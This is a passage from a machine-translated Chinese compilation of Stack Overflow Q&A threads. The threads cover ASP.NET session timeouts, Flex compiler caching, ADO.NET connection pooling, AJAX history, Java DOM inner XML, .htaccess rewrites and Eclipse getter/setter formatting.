> 赞同：2
> 
> 时间：2012-04-27T14:34:05.787

我正在使用 MVC3 ASp.net 作为初学者，我尝试了许多解决方案来解决我的会话问题（因为我在我的代码中使用 Session 变量，并且在超时后我没有会话值而我继续使用它并且我只是发现我的问题出在配置文件中。Authentication 和 sessionState 之间的超时应该如此接近。所以它们同时被杀死（空）//添加超时 1 和 2 进行测试..它应该至少是 29 和30

我也使用了其他方式：

从...开始 ：

```
 protected void Session_Start(object src, EventArgs e)
    {
        if (Context.Session != null)
        {
            if (Context.Session.IsNewSession)//|| Context.Session.Count==0)
            {
                string sCookieHeader = Request.Headers["Cookie"];
                if ((null != sCookieHeader) && (sCookieHeader.IndexOf("ASP.NET_SessionId") >= 0))
                {
                    //if (Request.IsAuthenticated)
                     FormsAuthentication.SignOut();
                     Response.Redirect("/Account/LogOn");
                }
            }
        }

    }

    protected void Session_End(object sender, EventArgs e)
    {
     //Code that runs when a session ends. 
     //Note: The Session_End event is raised only when the sessionstate mode 
     //is set to InProc in the Web.config file. If session mode is set to StateServer
      //or SQLServer, the event is not raised. 
        Session.Clear();          
    } 
```

和 ：

```
public class SessionExpireFilterAttribute : ActionFilterAttribute
{

    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        HttpContext ctx = HttpContext.Current;

        // check if session is supported
        if (ctx.Session != null)
        {

            // check if a new session id was generated
            if (ctx.Session.IsNewSession)
            {
                // If it says it is a new session, but an existing cookie exists, then it must
                // have timed out
                string sessionCookie = ctx.Request.Headers["Cookie"];
                if ((null != sessionCookie) && (sessionCookie.IndexOf("ASP.NET_SessionId") >= 0))
                {
                    ctx.Response.Redirect("~/Home/LogOn");
                }
            }
        }

        base.OnActionExecuting(filterContext);
    }
} 
```

甚至与 Ajax 合作解决会话问题：

```
 protected override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        if (Session.Count == 0 || Session["CouncilID"] == null)
            Response.Redirect("/Account/LogOn");

        if (Request.IsAjaxRequest() && (!Request.IsAuthenticated || User == null))
        {
            filterContext.RequestContext.HttpContext.Response.StatusCode = 401;
        }
        else
        {
            base.OnActionExecuting(filterContext);
        }
    }

    [AttributeUsage(AttributeTargets.Class | AttributeTargets.Method)]
    public class AuthorizeUserAttribute : AuthorizeAttribute
    {
        protected override bool AuthorizeCore(HttpContextBase httpContext)
        {
            if (!httpContext.Request.IsAjaxRequest())
            {//validate http request.
                if (!httpContext.Request.IsAuthenticated
                    || httpContext.Session["User"] == null)
                {
                    FormsAuthentication.SignOut();
                    httpContext.Response.Redirect("~/?returnurl=" + httpContext.Request.Url.ToString());
                    return false;
                }
            }
            return true;
        }

        protected override void HandleUnauthorizedRequest(AuthorizationContext filterContext)
        {
            if (filterContext.HttpContext.Request.IsAjaxRequest())
            {
                filterContext.Result = new JsonResult
                {
                    Data = new
                    {
                        // put whatever data you want which will be sent
                        // to the client
                        message = "sorry, but you were logged out"
                    },
                    JsonRequestBehavior = JsonRequestBehavior.AllowGet
                };
            }
            else
            {
                base.HandleUnauthorizedRequest(filterContext);
            }
        }

    } 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-27T20:01:24.297

不幸的是，它无法完成。会话超时仅发生在服务器端，在用户执行某种回发操作之前，您不会检测到这一点。

但是，您可以做的是注入一些 HTML 或 JavaScript 标头代码，这些代码将在会话超时的同一时间段内自动将用户推送到注销页面。这并不能保证完美同步，如果您的用户正在执行一些时间密集型项目并且您没有重置时钟，您可能会遇到问题。

我通常将此代码添加到我的 Page_Load 事件中以完成此操作。

```
' Register Javascript timeout event to redirect to the login page after inactivity
  Page.ClientScript.RegisterStartupScript(Me.GetType, "TimeoutScript", _
                                              "setTimeout(""top.location.href = 'Login.aspx'""," & _
                                               ConfigurationManager.AppSettings("SessionTimeoutMilliseconds") & ");", True) 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-04-27T14:37:31.010

当然，您需要`[Authorize]`在特定的控制器类甚至 Action 上使用。

```
[Authorize]
public class MailController : Controller
{
} 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-04-27T14:41:37.943

如果您使用以下登录控制器，它会在登录前将您发送到请求的 URL：

```
 [HttpPost]
    public ActionResult LogOn(LogOnModel model, string returnUrl)
    {

        if (ModelState.IsValid)
        {
            if (Membership.ValidateUser(model.UserName, model.Password))
            {

                FormsAuthentication.SetAuthCookie(model.UserName, model.RememberMe);

                if (Url.IsLocalUrl(returnUrl) && returnUrl.Length > 1 && returnUrl.StartsWith("/")
                    && !returnUrl.StartsWith("//") && !returnUrl.StartsWith("/\\"))
                {
                    //return Redirect(returnUrl);
                    if (!String.IsNullOrEmpty(returnUrl))
                    {
                        return Redirect(returnUrl);
                    }
                    else
                    {
                      return RedirectToAction("Index", "Home");
                    }

                }
                else
                {
                    return RedirectToAction("Index", "Home");
                }
            }
            else
            {
                ModelState.AddModelError("", "The user name or password provided is incorrect.");
            }
        }

        // If we got this far, something failed, redisplay form
        return View(model);
    } 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2011-05-03T00:44:45.837

正如 Zhaph - Ben Duguid 指出的那样，这对于 AJAX 请求来说变得很棘手。这是我使用 AJAX 进行这项工作的解决方案（使用 Telerik Web 控件，但我相信它们是使用 ASP.NET AJAX 工具包构建的）。

简而言之，我推出了自己的滑动到期会话类型的东西。

在我的 Site.Master 中，我在每次回发时更新会话变量（回发或 AJAX 请求，因为 AJAX 请求仍会启动 Page_Load 事件）：

```
protected void Page_Load(object sender, EventArgs e)
    {
        if (!this.IsPostBack)
        {
            if (this.Request.IsAuthenticated)
                this.pnlSessionKeepAlive.Visible = true;
            else
                this.pnlSessionKeepAlive.Visible = false;
        }

        if (this.Session["SessionStartDateTime"] != null)
            this.Session["SessionStartDateTime"] = DateTime.Now;
        else
            this.Session.Add("SessionStartDateTime", DateTime.Now);
    } 
```

然后在我的 site.master 标记中，我包含了一个带有 ASPX 页面的 iframe，我使用“幕后”来检查我的自定义滑动到期是否已过期：

```
<asp:Panel runat="server" ID="pnlSessionKeepAlive" Visible="false">
 <iframe id="frame1" runat="server" src="../SessionExpire.aspx" frameborder="0" width="0" height="0" / >
 </asp:Panel> 
```

现在在我的 SessionExpire.aspx 页面中，我只是经常刷新页面并检查时间戳是否已过期，如果是，我重定向到我的 logout.aspx 页面，然后确定将用户发送回哪个登录页面：

```
public partial class SessionExpire : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        /* We have to do all of this because we need to redirect to 2 different login pages. The default .NET
         * implementation does not allow us to specify which page to redirect expired sessions, its a fixed value.
         */
        if (this.Session["SessionStartDateTime"] != null)
        {
            DateTime StartTime = new DateTime();
            bool IsValid = DateTime.TryParse(this.Session["SessionStartDateTime"].ToString(), out StartTime);
            if (IsValid)
            {
                int MaxSessionTimeout = Convert.ToInt32(ConfigurationManager.AppSettings["SessionKeepAliveMins"]);
                IsValid = (DateTime.Now.Subtract(StartTime).TotalMinutes < MaxSessionTimeout);
            }

            // either their session expired or their sliding session timeout has expired. Now log them out and redirect to the correct
            // login page.
            if (!IsValid)
                this.Logout();
        }
        else
            this.Logout();

        // check every 60 seconds to see if the session has expired yet.
        Response.AddHeader("Refresh", Convert.ToString(60));
    }

    private void Logout()
    {
        this.Page.ClientScript.RegisterClientScriptBlock(this.GetType(), "TimeoutScript",
                    "setTimeout(\"top.location.href = '../Public/Logout.aspx'\",\"1000\");", true);
    }
} 
```

非常感谢上面发布信息的人，这使我找到了我的解决方案，并希望它对其他人有所帮助。

# apache-flex - 除非我先删除文件，否则 Compc（Actionscript 库编译器）不会失败？

> ID：484971
> 
> 赞同：0
> 
> 时间：2009-01-27T19:57:13.433
> 
> 标签：apache-flex, flash, actionscript, mxml, compc

这是场景：我在源目录上运行 compc 以在进行一些更改后重新编译已经存在的库，从而成功完成。然后我删除库（.swc 文件）并重新编译，这会导致抛出许多错误。

在此期间没有任何变化 - 显然这应该两次都成功或两次都失败。

```
libs/pv3ddebug $ compc -library-path+=.. -source-path=./src -compiler.optimize -include-sources+=./src -output ../pv3ddebug.swc
Loading configuration file /Users/bill/flex_sdk_3/frameworks/flex-config.xml
/Users/bill/lg/vision/libs/pv3ddebug.swc (152944 bytes)

/libs/pv3ddebug $ rm ../pv3ddebug.swc 

/libs/pv3ddebug $ compc -library-path+=.. -source-path=./src -compiler.optimize -include-sources+=./src -output ../pv3ddebug.swc
Loading configuration file /Users/bill/flex_sdk_3/frameworks/flex-config.xml
/Users/bill/lg/vision/libs/pv3ddebug/src/com/phenomblue/pv3ddebug/PV3DDebug.as(45): col: 34 Error: Type was not found or was not a compile-time constant: AdvancedView.

                public function PV3DDebug(view:AdvancedView)
                                               ^
... more errors follow 
```

我想我已经找到了错误发生的原因，并且可以纠正它们，但我很不安第一次编译没有失败。

我有一个理论：

1.  pv3ddebug 所依赖的库 A 是正确的
2.  pv3ddebug 编译成功（并且正确）
3.  库 A 进入无法使用 pv3ddebug 编译的状态
4.  pv3ddebug 编译成功，错误，因为 compc 没有注意到 A 被更新为失败状态
5.  删除 pv3ddebug 然后重新编译导致 compc 尝试使用新的 A 进行编译，因此编译失败。

我的问题是：第 4 步是错误吗？这是我应该预料到的缓存行为，还是可以通过编译器开关进行更改？有什么事情是我的理论无法解释的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-28T15:10:58.127

你可以试试 -incremental=false。这应该是命令行编译器的默认设置，但是您所描述的听起来像是已启用。

# asp.net - 在从池中获取连接之前经过的超时时间

> ID：484984
> 
> 赞同：2
> 
> 时间：2009-01-27T20:01:32.847
> 
> 标签：asp.net, ado.net

我每隔几天就会收到此错误。几天后我不会看到错误，然后我会在一分钟左右的时间内得到 20 个左右的混乱。

我已经非常彻底地抛出我的代码，以便我使用这个基本设置来访问我的数据库。

```
try
{
  myConnection.Open();
  mySqlDataAdapter.Fill(myDataTable);
  myConnection.Close();
}
Catch (Exception err)
{
  if (myConnection.State != ConnectionState.Closed) myConnection.Close();
  throw err;
} 
```

我理解它的方式应该执行我的查询并立即将连接释放回池但是如果查询出现问题然后我捕获异常关闭我的连接然后抛出错误，最终被困在应用程序级别和记录并通过电子邮件将错误发​​送给我。

即使在我的代码中使用它，我仍然遇到这个问题。我可以做些什么来诊断问题的根本原因？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T20:13:38.470

问题是池中可以拥有的池连接数。

在您的连接字符串中，您可以添加“Max Pool Size=100”属性来增加池的大小。但是，听起来您正在同时运行大量 SQL 查询，所有这些查询都是长时间运行的。也许您应该考虑缩短查询或通过单个连接按顺序运行它们的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T20:10:35.777

将代码更改为这样的代码使其更易于阅读..

```
try
{
  myConnection.Open();
  mySqlDataAdapter.Fill(myDataTable);
 }
Catch (Exception err)
{
  throw err;
}
finally
{
 myConnection.Close();
} 
```

但这对你的超时没有帮助..

听起来填充语句需要很长时间。或者问题实际上出在其他地方，您没有连接。SQL Profiling 可以帮助确定 select 语句是否需要很长时间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-05T17:22:11.080

这里有一个快速的问题。您是否偶然在访问数据库上，因为您可以同时拥有的连接数有限制，这会导致您的错误类型。SQL 服务不应该有同样的问题。

如果您正在运行 SQL Server，则关闭连接池并查看它是否对您的应用程序有影响。

大约 5 年前，当我们的公司快速发展时，我发现我们的系统在我们开始不断达到用户上限时基本上破坏了访问权限。我们在大约 24 小时内切换到 SQL 并且从那以后没有遇到任何问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T20:36:07.363

如果您使用 MSSQL 设置运行一两天的配置文件.. 将配置文件保存到文件或表中，文件应该更快...

然后有一个脚本将该文件读取到一个表中，您可以轻松地查询它以找到运行时间最长的查询。

# .net - 像谷歌一样的jquery超链接

> ID：484994
> 
> 赞同：0
> 
> 时间：2009-01-27T20:03:52.157
> 
> 标签：.net, asp.net, jquery, datagrid

你有没有注意到在 gmail 中，当电子邮件在你的收件箱中更新时，你会得到一个指向它的超链接，如下所示：

[http://mail.google.com/mail/#inbox/23e0377656b24123](http://mail.google.com/mail/#inbox/23e0377656b24123)

如果您单击该链接，它不会重新加载页面？

你能用 jquery 和数据网格做到这一点吗？这样您就可以获得网格中项目的链接，该网格是异步填充的。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T20:14:19.390

你需要一个 AJAX 历史库——[这里是 YUI's](http://developer.yahoo.com/yui/history/)，并且一个快速的谷歌[为 jQuery 找到了这个](http://www.mikage.to/jquery/jquery_history.html)（如果那个不完全适合你的需要，可能还有其他的）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T20:45:19.903

从 .net 3.5 sp1 开始，Microsoft 还具有 AJAX 历史处理功能。[点击这里](http://msdn.microsoft.com/en-us/library/bb310856.aspx)。看看[Sys.Application.addHistoryPoint](http://msdn.microsoft.com/en-us/library/cc488025.aspx)和[Sys.Application.navigate](http://msdn.microsoft.com/en-us/library/cc488024.aspx)。实际上 AJAX 化你的网格真的取决于你。

# java - Java/DOM：获取节点的 XML 内容

> ID：484995
> 
> 赞同：7
> 
> 时间：2009-01-27T20:04:05.697
> 
> 标签：java, xml, dom

我正在使用 W3C DOM 解析 Java 中的 XML 文件。我被困在一个特定的问题上，我不知道如何获取节点的整个内部 XML。

该节点如下所示：

```
<td><b>this</b> is a <b>test</b></td>
```

我必须使用什么功能来获得它：

```
"<b>this</b> is a <b>test</b>"
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2010-12-28T20:41:37.267

我知道这是很久以前问过的，但是对于下一个搜索的人（今天是我），这适用于 JDOM：

```
JDOMXPath xpath = new JDOMXPath("/td");
String innerXml = (new XMLOutputter()).outputString(xpath.selectNodes(document)); 
```

这会将所有子节点的列表传递给 outputString，它将按顺序将它们序列化。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-27T20:12:12.077

您必须使用 transform/xslt API，使用 <b> 节点作为要转换的节点，并将结果放入 new StreamResult(new StringWriter()); . 请参阅[如何从 java 中漂亮地打印 xml](https://stackoverflow.com/questions/139076/how-to-pretty-print-xml-from-java)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-03-13T09:48:49.943

你对此有什么看法？我今天在 android 上遇到了同样的问题，但我设法制作了简单的“序列化器”

```
private String innerXml(Node node){
        String s = "";
        NodeList childs = node.getChildNodes();
        for( int i = 0;i<childs.getLength();i++ ){
            s+= serializeNode(childs.item(i));
        }
        return s;
    }

    private String serializeNode(Node node){
        String s = "";
        if( node.getNodeName().equals("#text") ) return node.getTextContent();
        s+= "<" + node.getNodeName()+" ";
        NamedNodeMap attributes = node.getAttributes();
        if( attributes!= null ){
            for( int i = 0;i<attributes.getLength();i++ ){
                s+=attributes.item(i).getNodeName()+"=\""+attributes.item(i).getNodeValue()+"\"";
            }
        }
        NodeList childs = node.getChildNodes();
        if( childs == null || childs.getLength() == 0 ){
            s+= "/>";
            return s;
        }
        s+=">";
        for( int i = 0;i<childs.getLength();i++ )
            s+=serializeNode(childs.item(i));
        s+= "</"+node.getNodeName()+">";
        return s;
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T20:47:12.583

呃......您也可以调用 toString() 并手动或使用正则表达式来切掉开始和结束标签。

编辑： toString() 没有达到我的预期。翻出 O'Reilly [Java & XML 这本书](http://books.google.com/books?id=ZOlQAAAAMAAJ)，讨论 Java DOM 的加载和保存模块。

尤其是看起来很有前途的[LSSerializer 。](https://java.sun.com/javase/6/docs/api/org/w3c/dom/ls/LSSerializer.html)您可以调用 writeToString(node) 并按照我的建议切断开始和结束标签，或者尝试使用[LSSerializerFilter](https://java.sun.com/javase/6/docs/api/org/w3c/dom/ls/LSSerializerFilter.html)不打印顶部节点标签（不确定这是否可行；我承认我以前从未使用过 LSSerializer .)

阅读 O'Reilly 的书似乎表明要做这样的事情：

```
 DOMImplementationRegistry registry = DOMImplementationRegistry.newInstance();
 DOMImplementationLS lsImpl = 
   (DOMImplementationLS)registry.getDOMImplementation("LS");
 LSSerializer serializer = lsImpl.createLSSerializer();
 String nodeString = serializer.writeToString(node); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-27T22:13:45.700

node.getTextContent();

如果没有其他原因，您应该使用 Dom4J 的 JDom 来处理节点，以正确处理空格。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-08-24T16:56:51.243

要删除不必要的标签，可能可以使用这样的代码：

DOMConfiguration config = serializer.getDomConfig(); config.setParameter("canonical-form", true);

但它并不总是有效，因为“canonical-form=true”是可选的

# regex - .htaccess 任意长度

> ID：484998
> 
> 赞同：0
> 
> 时间：2009-01-27T20:05:24.103
> 
> 标签：regex, .htaccess

执行此类操作的有效 .htaccess 规则是什么

```
/mypage/ --> /index.php?page=mypage
/mypage/param1/value1/ -->index.php?page=mypage&params=param1/value1 
```

可能有无限数量的参数？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-27T20:10:10.583

最好是将 /mypage/ 之后的整个部分作为参数传递给 php 脚本并对其进行解码：

```
RewriteRule ^mypage/(.*) index.php?page=mypage&params=$1 [L,NC,QSA] 
```

此外，如果您希望页面是动态的：

```
RewriteRule ^([^/\.]+)/(.*) index.php?page=$1&params=$2 [L,NC,QSA] 
```

或者

```
RewriteRule ^([^/\.]+)(/(.*))? index.php?page=$1&params=$3 [L,QSA] 
```

**编辑**
添加了 Cal 的建议，谢谢 Cal。

**编辑**
如果我正确理解您的评论：（如果不是，请解释）。您可以只使用带有默认操作的 switch 语句，该操作与页面变量的索引操作相同：

```
switch($_GET['page']){
 case 'mypage':
  doMyPageStuff();
 break;
 case 'foo':
  doFooStuff();
 break;
 case 'index':
 default:
  doIndexStuff();
 break;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T20:10:24.950

```
RewriteRule ^([^/]+)/(.+)/?$    index.php?page=$1&params=$2 
```

或者非常相似 - 手头没有服务器可以检查！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-28T10:08:18.130

这是我的建议：

```
RewriteRule ^([^/]+)/(([^/]+/[^/]+(/[^/]+/[^/]+)*)/)?$ /index.php?page=$1&params=$3 [L] 
```

这不是很好，但正如您所要求的那样。它只允许以下形式的路径：

```
/mypage/
/mypage/param1/value1/
/mypage/param1/value1/param2/value2/
/mypage/param1/value1/param2/value2/param3/value3/
/mypage/param1/value1/param2/value2/param3/value3/param4/value4/
… 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-28T00:58:39.953

我看到这已经有一个公认的答案，但我相信以下内容将只使用 mod_rewrite 完成您想要的。

```
RewriteCond %{QUERY_STRING} ^(.*)$
RewriteRule ^(.*/)([^/]+)/([^/]+) $1?$2=$3&%1 [L]
RewriteCond %{QUERY_STRING} ^(.*)$
RewriteRule ^([^/]+)/ $1.php?%1 [L] 
```

它之所以有效，是因为 mod_rewrite 的行为是递归的。也就是说，每次重写后，都会再次处理新的 URL。每次通过，最后的两个值都会变成查询参数并添加到查询字符串中。

这将重写以下内容

```
/mypage/param1/val1/param2/val2/param3/val3/...     --->
/mypage.php?param1=val1&param2=val2&param3=val3&... 
```

当只剩下一个参数时它会停止。它将采用第一个“参数”并使用该名称调用 .php 文件。param/val 对的数量没有限制。

--
bmb

# eclipse - Eclipse getter/setter 格式

> ID：484999
> 
> 赞同：10
> 
> 时间：2009-01-27T20:05:56.457
> 
> 标签：eclipse

有谁知道 Eclipse 插件或方法让 Eclipse 在一行上生成 getter/setter，如下所示：

```
public String getAbc() { return abc; } 
```

代替

```
public String getAbc() {
   return abc;
} 
```

我在 Eclipse v. 3.2.2 上。

谢谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-01-27T20:56:11.973

我不知道如何让 Eclipse 以您想要的格式生成它们，但是您可以在生成方法后使用这些正则表达式进行搜索/替换：

寻找：

```
(?m)((?:public |private |protected )?[\w$]+) (get|set|is)([\w$]+)\(([\w$]+(?:\[\])? [\w$]+)?\) \{\s+(return [\w$]+;|this.[\w$]+ = [\w$]+;)\s+\} 
```

替换为：

```
$1 $2$3($4) { $5 } 
```

此表达式会将生成的 getter 和 setter 转换为一行。不要担心混合使用转换和新生成的方法来运行它；它会工作得很好。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-22T13:34:58.100

我认为匹配泛型也很重要，所以正确的正则表达式是：

```
(?m)((?:public |private |protected )?[\w\<\>$]+) (get|set|is)([\w$]+)\(([\w\<\>$]+ [\w$]+)?\) \{\s+(return [\w$]+;|this.[\w$]+ = [\w$]+;)\s+\} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-05-29T01:23:34.813

作为正则表达式替换方法的一种变体，以下内容将重新格式化空白，以便 setter 后跟一个空行，但 getter 不是。

寻找：

```
(\s(?:get|is|set)\w+\([^)]*\))\s*\{\s*(?:([^=;}]+;)\s*\}\s*(\R)|([^=;}]+=[^=;}]+;)\s*\}\s*(\R)) 
```

替换为：

```
$1 { $2$4 } \R$5 
```

结果是：

```
int getTotal() { return total; } 
void setTotal(int total) { this.total = total; } 

List<String> getList() { return list; } 
void setList(List<String> list) { this.list = list; } 

Map.Entry<String, Integer> getEntry() { return entry; } 
void setEntry(Map.Entry<String, Integer> entry) { this.entry = entry; } 
```

这是一个小的审美问题，但我认为如果你正在寻找这个问题的答案，那么你可能（几乎）和我一样肛门;-)

我知道我的正则表达式条件不像@Hosam 那样严格，但我没有经历过任何“误报”替换。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T21:40:29.463

Eclipse 中的 Java 代码格式不区分 getter/setter 和类中的任何其他方法。所以这不能通过内置的 eclipse 格式来完成。

您将需要：

1.  使用上述正则表达式运行搜索/替换
2.  获取外部插件，如[PMD](http://pmd.sourceforge.net/)或[CheckStyle](http://checkstyle.sourceforge.net/)并根据先前的选项强制执行正则表达式规则

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-08-09T03:21:04.123

您可以使用快速代码插件来生成这种 getter setter。此处给出了详细信息：http: [//fast-code.sourceforge.net/documentation.htm#create-new-field](http://fast-code.sourceforge.net/documentation.htm#create-new-field)。

![创建变量](https://i.stack.imgur.com/8HQSa.jpg)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-18T21:19:53.753

我想发表对指定答案的评论，但我似乎做不到。

我修改了 Hosam Aly 的答案以使用表单的通用和内部类型：

```
List<X> 
```

和

```
Map.Entry 
```

修改后的正则表达式搜索字符串为：

```
(?m)((?:public |private |protected )?[\w\.\<\>$]+) (get|set|is)([\w$]+)\(([\w\.\<\>$]+ [\w$]+)?\) \{\s+(return [\w\.\<\>$]+;|this.[\w$]+ = [\w$]+;)\s+\} 
```

此正则表达式允许在类型中使用尖括号和点。

例如：

```
public List<String> getStringList() 
```

和

```
public void setStringList(List<String> list) 
```

和

```
public Map.Entry getEntry () 
```

并且替换字符串和之前一样：

```
$1 $2$3($4) { $5 } 
```************`